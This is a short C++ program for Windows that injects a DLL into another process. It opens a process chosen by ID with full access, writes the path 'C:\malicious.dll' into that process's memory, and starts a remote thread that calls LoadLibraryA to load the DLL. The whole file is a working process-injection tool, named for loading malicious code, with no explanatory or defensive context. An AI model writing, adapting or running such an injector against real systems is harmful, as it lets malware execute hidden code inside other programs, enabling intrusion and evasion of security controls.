#include <windows.h>
#include <iostream>

int main() {
    DWORD processID;
    std::cout << "Enter Process ID: ";
    std::cin >> processID;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "Failed to open process." << std::endl;
        return 1;
    }

    const char* dllPath = "C:\\malicious.dll";
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);
    if (!hThread) {
        std::cerr << "Failed to create remote thread." << std::endl;
    }
    else {
        std::cout << "DLL injected successfully!" << std::endl;
    }

    CloseHandle(hProcess);
    return 0;
}
